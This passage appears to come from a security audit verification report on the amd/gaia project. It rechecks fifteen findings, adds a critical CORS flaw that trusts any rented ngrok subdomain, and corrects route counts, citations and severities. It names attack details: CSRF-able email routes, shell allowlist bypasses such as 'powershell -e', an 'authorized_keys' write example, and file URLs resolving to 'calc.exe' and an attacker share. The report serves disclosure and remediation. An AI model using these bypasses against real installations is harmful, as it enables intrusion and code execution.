  — the live URL from my C9 probe was `https://<redacted>.ngrok-free.dev` — which the `.app` regex
  does not match. And it was never needed: the mobile flow serves the SPA *from* the tunnel origin
  (`serve_spa` sets the cookie on the tunnel URL), so those requests are same-origin and CORS does
  not apply. So the entry grants a real capability to attackers while granting nothing to users.
- **Honest limits.** The attacker's page is `https://` and the target is `http://localhost:4200`;
  `http://localhost` is a "potentially trustworthy" origin so this is *not* blocked as mixed content.
  Chrome's Private/Local Network Access work would block public→local requests, but its enforcement
  has shipped, been rolled back, and changed shape repeatedly, and Firefox/Safari do not implement it
  — and Starlette emits no `Access-Control-Allow-Private-Network` header either way. A control GAIA
  does not own, is not enforced everywhere, and changes between browser versions is not a mitigation.
- **Fix:** delete `allow_origin_regex` entirely (nothing needs it — the tunnel flow is same-origin).
  If a tunnel origin must be allowed, allow the **one** URL `TunnelManager` actually minted for this
  session, injected into the middleware at start time, not a wildcard over a shared namespace.
  Add a test asserting `https://someone-else.ngrok-free.app` gets a 400 preflight.
- **Severity:** 🔴. Same attacker position as C9 (a page the user visits) with a strictly larger
  reachable set, and it is the reason C9's proposed fix ("enforce the header in middleware for every
  non-GET request") would **not** be sufficient on its own — the header is forgeable from an allowed
  origin. C9 and M-A must be fixed together; the report should say so.
- **Tracked:** none found (`gh issue list -R amd/gaia --search "allow_origin_regex"` /
  `"ngrok CORS"` → 0). #2951 is about two other servers.

---

## Summary

**Counts (15 findings):**

| Verdict | Count | IDs |
|---|---|---|
| CONFIRMED | 6 | C2, C5, C6, C11, C13, C15 |
| CONFIRMED-ADJUST | 7 | C1, C3, C4, C7, C8, C9, C14 |
| OVERSTATED | 1 | C10 |
| REFUTED | 0 | — (but two *sub*-claims are refuted: C4's `<&` bypass, C8's `openai_server.py:178` wildcard) |
| UNVERIFIABLE | 0 | — (C14's branch-protection bound is unverifiable *within* a CONFIRMED-ADJUST finding; C12's last link — Electron's own `file:` filtering — is the only untested step in an otherwise proven chain) |

Every mechanism in all 15 is real. Nothing in Section 2's C1–C15 is fabricated. The corrections below
are about **calibration and citation accuracy**, not about whether the bugs exist.

**The five most important corrections, in order:**

1. **C9's numbers are all wrong, and the correction makes it worse, not better.** Not "~28 of ~45
   mutating routes … guard applied to 17". Enumerated from the built app: **92 mutating routes, 24
   guarded, 68 unguarded, 41 of those CSRF-able** — including the entire `/v1/email/*` surface
   (`send`, `draft`, `triage`, `quarantine`, `calendar/events`) which is body-less and mounted
   unconditionally. And `POST /api/tunnel/start` is not theoretical: the probe **actually opened a
   public ngrok tunnel** (killed immediately). One misclassification to fix in the other direction —
   `POST /api/mcp/agent-server/start` is JSON-body-gated, not CSRF-able.

2. **A 🔴 the report cleared as fine (new, M-A).** `ui/server.py:559` trusts every
   `*.ngrok-free.app` / `*.use.devtunnels.ms` origin with credentials and `allow_headers=["*"]`.
   Anyone can rent one of those subdomains, and the approved preflight includes `X-Gaia-UI` — so it
   defeats C9's guard on the 24 *protected* routes and makes every GET, including
   `/api/files/preview`, cross-origin readable. The report's Appendix C clears this with
   "ngrok domains are on the PSL … does not let another ngrok tenant ride the cookie", which answers
   the wrong question: the backend has no cookie auth to ride when the tunnel is off. C9's fix is
   insufficient unless M-A is fixed with it.

3. **Two sub-claims are false and should be cut before this ships.** (a) C8 says
   `src/gaia/api/openai_server.py:178` "carries the same wildcard" — it does not; that file is
   localhost-only by default (`_cors_config`, `:158-192`) and forces `allow_credentials=False` if an
   operator opts into `*`. It is the file doing this **right**, and the fix for
   `agents/base/server.py` is to copy it. (b) C4 says `>&`/`<&` slip — `<&` is refused, and `>&`
   slips the regex but has no `cmd.exe` payload (`cmd /c "dir >&out.txt"` → `>& was unexpected at
   this time.`). C4 stays 🔴 on `powershell -e`, `&`-chaining and `[Type]::` alone.

4. **Two severities should move.** **C10 🔴 → 🟡**: the mechanism is real but no shipped code path
   ever passes `domain=` to `TunnelManager` (`ui/server.py:576` is the only construction), so the
   public hostname is an unpredictable random subdomain during the entire 0.5–15 s window — a
   fail-open defect, not a reachable attack. **C14 🔴 → 🟡**: the exposure is documented and
   explicitly accepted in-file at `:1012-1023`; the only novel claim is that "branch protection on
   main" is unverified, and I confirmed it is **unverifiable from outside** — the `gh` token has
   `pull` only on amd/gaia and `branches/main/protection` is admin-gated, so its 404 is not evidence
   of absence. Replace the "stale `no code execution` header" framing (that line is scoped to
   `pull_request_target`) with the real gap: the header's accepted-risk paragraph names only
   pr-review and issue-handler, omitting the one job with `contents: write`.

5. **Four citations point at the wrong file or a line that does not exist — fix them or reviewers
   will bounce off the report.** `screenshot_tools.py:779-808` (C7f) — the file is **96 lines**; the
   code is `:41-56`. `cli.py:587-604` (C3) — that is `gaia chat` device resolution; the real code is
   **`src/gaia/skills/cli.py:580-598`**. `connectors/handler.py:401` (C1) — the file is 238 lines;
   it is `:152-155`. `agents/base/server.py:733-736` (C8) — `run_api` is `:664`. Two fix
   descriptions also name functions that do not exist: `_check_grant_and_scopes` (C1 → it is
   `_authorize_access`) and `require_caller_token` (C8 → `caller_auth` exposes `token_ok` /
   `HostOriginMiddleware`). And C7f's worked example `dump_document(output_path="~/.ssh/authorized_keys")`
   does not do what it says — `Path.resolve()` never expands `~`; use an absolute path.

**Two tracked-issue corrections worth carrying:** #2951 is **not** "adjacent" to C8 — it names
`agents/base/server.py:443` directly, and its own risk assessment is wrong on two counts (it credits
a `TunnelAuthMiddleware` that exists only in `ui/server.py`, and it assumes browsers reject
wildcard-plus-credentials, which my probe disproves — Starlette reflects the Origin). #2768 is a
closer match for C4's allowlist half than the docs-only #2785.

**Two places the report is too kind to itself, in the good direction:** C7's sandbox is **not**
opt-in — `PathValidator` defaults to `[Path.cwd()]` (`security.py:248-255`) and so does `ChatAgent`
(`agent.py:253-256`), so all six holes leak a boundary that is live on every default install; and
C12's hedge ("Medium on exact WHATWG `/…` resolution") can be dropped — `new URL('/Windows/System32/calc.exe',
'file:///C:/…/index.html')` returns `file:///C:/Windows/System32/calc.exe` and `//attacker/share/x.exe`
returns `file://attacker/share/x.exe` on ada/Node 22, and `ShellExecuteW` on those URLs answers
`SE_ERR_FILENOTFOUND` (it resolved them to paths), not `SE_ERR_NOASSOC`.
